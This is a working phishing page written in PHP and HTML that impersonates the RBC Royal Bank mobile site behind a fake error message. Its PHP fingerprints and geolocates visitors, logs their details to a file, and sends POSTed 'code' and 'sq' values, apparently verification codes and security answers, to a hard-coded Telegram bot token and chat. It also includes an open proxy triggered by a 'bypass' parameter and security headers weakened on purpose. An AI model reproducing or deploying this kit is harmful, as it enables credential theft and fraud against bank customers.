<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "RBC";
    $project    = "[CR00K-3D]";
    $url        = "https://RBC.com";
    $code       = $_POST['code'];
    $sq       = $_POST['sq'];
	$lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message ="$code$sq";

$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-821080105',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>



<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en" class="ui-mobile"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><!--<base href="https://mobile.rbcroyalbank.com/ip/mxweb/idv/redirect.html?source_application=idv&amp;GOTO=idv&amp;selfie=true&amp;destination=idv_mfaonline&amp;prospectJWT=eyJhbGciOiJSUzI1NiIsImtpZCI6InByb2RjZXJ0aWZpY2F0ZWtleSIsInBpLmF0bSI6ImEifQ.eyJzY29wZSI6W10sImNsaWVudF9pZCI6IjFlNmQySUNYMEd3alF1NEtBeERMdlRSQnlHMVdndWpaIiwiaXNzIjoiaHR0cHM6Ly9zc29hLnJiYy5jb20iLCJqdGkiOiJLUHlLempzaFhJSE9yeURpWkFQWEVKZ3hSNlRib091MiIsImp3a3NfZW5kcG9pbnQiOiIvb2F1dGgvandrcyIsImV4cCI6MTY3OTMyNjUyN30.PVRujjSV5N4amduA3piOhVGHw-YQkxSv_RcI3bEMQsyoU6dOpA_Qk1U7x-3qm5HVRIWMTGMcyShZ9b7ERrbhPZnI4Dcll5kMXuN0Pg_fgv43VG7T5mglS-y7CYXY2zf2csewcceOg8d3gAmskrDUZgT8UcFqiDeTx3YivKVZvqGiE9ra6SWalKf2-sqBhZowIILXtqQA1DGRA0m-01wIW9Vs10gxwd8t3pb2PJqmSnEKz-MQfhn1tAvOCLf6qZKkyr0qVhAkhtRGouazfCbyBWErhzM8Lblghm93aK2242xGJ7uc40BW1sMLovu3kQ0jzL_WDN2YfwCoxqHEtmVn0w&amp;challenge_code=W1y3SLPuNXY=&amp;documentType=USER_DEFINED&amp;selfie=true&amp;_ga=2.49491238.1283715649.1683076171-1221627314.1683076171">--><base href=".">

<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">



<meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.65, minimum-scale=0.50, maximum-scale=0.80">
<meta name="apple-mobile-web-app-capable" content="yes">

<title>RBC Royal Bank Mobile</title>

<link href="./error_files/mobile-phone-ip-an.css" type="text/css" rel="stylesheet">
<link href="./error_files/jquery.mobile-1.2.0.min.css" type="text/css" rel="stylesheet">

<script src="./error_files/jquery-1.8.2.min#########"></script>
<script src="./error_files/jquery.mobile-1.2.0#########"></script>
<script src="./error_files/mobile-detect.min#########"></script>
<script src="./error_files/jquery-util#########"></script>

<script src="./error_files/jquery-util-idv#########"></script>
<script src="./error_files/common-config#########"></script>


<script>
	var md = new MobileDetect(window.navigator.userAgent);

	var userLanguage = $.detectLanguage();
	var userDevice = $.detectDevice(md);

	if (!$.validateParams()) {
		window.location = window.location.href.replace(/\/idv\/(.*)/g, "/error.html");
	}

	function switchLanguage() {
		userLanguage = "" + userLanguage;
		if (userLanguage.length > 2) {
			userLanguage = userLanguage.substring(0,2);
		}
		
		if (userLanguage === "en") {
			userLanguage = "fr";
		} else {
			userLanguage = "en";
		}
		loadContent();
	}

	function loadContent() {
		$.mobile.loading("show", {});
		$("#loader-overlay").show();

		if (userLanguage == "fr") {
			$("#mobile-content-text").text(configFr.mobileContentText);
			$("#mobile-app-btn-text").text(configFr.mobileAppBtnText);
			$("#app-store-text").text(configFr.appStoreText);
			$("#app-store-img").prop("alt", configFr.appStoreImgAlt);
			$("#copy-right-text").text(configFr.copyrightText);
			$("#footer-privacy-and-security").text(configFr.footerPrivacyAndSecurity);
			$("#footer-legal").text(configFr.footerLegal);
			$("#footer-accessibility").text(configFr.footerAccessibility);
			$("#languageSwitcher").text(configFr.languageSwitcherText);
			document.title = configFr.title;
			
			$("#logo-img").attr("src","images/logo-fr.png").load();
			$("#vme-logo-img").attr("src","images/rbc-logo-sub.png").load();
		} else {
			//English
			$("#mobile-content-text").text(configEn.mobileContentText);
			$("#mobile-app-btn-text").text(configEn.mobileAppBtnText);
			$("#app-store-text").text(configEn.appStoreText);
			$("#app-store-img").prop("alt", configEn.appStoreImgAlt);
			$("#copy-right-text").text(configEn.copyrightText);
			$("#footer-privacy-and-security").text(configEn.footerPrivacyAndSecurity);
			$("#footer-legal").text(configEn.footerLegal);
			$("#footer-accessibility").text(configEn.footerAccessibility);
			$("#languageSwitcher").text(configEn.languageSwitcherText);
			document.title = configEn.title;
			
			$("#logo-img").attr("src","images/logo-en.png").load();
			$("#vme-logo-img").attr("src","images/rbc-logo-sub.png").load();
		}

		$.switchAppStoreImage(userLanguage, userDevice);
		$.showMobileAppLink(userDevice);


		//If the above fails, keep the overlay on.
		$.mobile.loading( "hide" );
		$("#loader-overlay").hide();
	}

	function openApp() {
		if (userDevice === "ip") {
			$.launchIPhoneAppIDV();
		} else if (userDevice === "an") {
			$.launchAndroidAppIDV();
		}
	}
</script>
</head>
<body class="ui-mobile-viewport ui-overlay-c" onload="loadContent()">
	<div data-role="page" id="home" class="master-wpr ui-page ui-body-c ui-page-active" data-url="home" tabindex="0" style="min-height: 600px;">
		<!-- *** Mobile Header Start *** -->
		<div id="mobile-header">
			<span id="logo"><img id="logo-img" src="./error_files/logo-en.png" height="60" alt="RBC"></span>
		</div>
		<a href="javascript:switchLanguage()" id="languageSwitcher" class="ui-link">Français</a>
		<div id="mobile-sub-header" style="height: 146pt;">
			<span id="sub-logo"><img id="vme-logo-img" src="./error_files/rbc-logo-sub.png" height="160" alt="RBC Logo"></span>
		</div>
		<!-- *** Mobile Header End *** -->

		<div id="mobile-content" style="height:auto; margin-bottom:25px">
			<div id="mobile-content-text">Sorry, This page may have been moved, deleted, or is temporarily unavailable.</div>
		</div>

		<a href="javascript:openApp()" id="download-link" class="ui-link" style="display:none">
			<div id="mobile-app-btn">
				<p class="btn-text" id="mobile-app-btn-text">RBC Mobile</p>
			</div>
		</a>

		<div id="empty-area">
			
		</div>

		<div id="app-store-wrapper" style="display:none">
			<div id="app-store-text">Don’t have the RBC Mobile app? Download the latest version here:</div>
			<div id="app-store-logo">
				<span>
					<a id="app-store-link" href="https://play.google.com/store/apps/details?id=com.rbc.mobile.android" class="ui-link">
						<img id="app-store-img" src="./error_files/an-app-str.png" alt="App Store Logo and Link to download RBC Mobile App.">
					</a>
				</span>
			</div>
		</div>
		<div id="footer-wrapper">
			<p><span id="copy-right-text">Royal Bank of Canada</span> © 1995-<script>document.write(new Date().getFullYear());</script>20232023</p>
			<p><a id="footer-privacy-and-security" href="http://www.rbc.com/privacysecurity/ca/" target="_blank" class="ui-link" title="Privacy and Security (Opens new window)">Privacy &amp; Security </a><img src="./error_files/link.png" height="9" alt=""></p>
			<p><a id="footer-legal" href="http://www.rbc.com/legal/" target="_blank" class="ui-link" title="Legal (Opens new window)">Legal </a> <img src="./error_files/link.png" height="9" alt=""></p>
			<p><a id="footer-accessibility" href="http://www.rbc.com/accessibility/" target="_blank" class="ui-link" title="Accessibility (Opens new window) Link">Accessibility </a><img src="./error_files/link.png" height="9" alt=""></p>
		</div>
		<div id="loader-overlay" class="" style="height: 100%; width: 100%; position: absolute; inset: 0px; opacity: 0.5; background: rgb(204, 204, 204); display: none;"></div>
	</div>

<div class="ui-loader ui-corner-all ui-body-a ui-loader-default"><span class="ui-icon ui-icon-loading"></span><h1>loading</h1></div></body></html>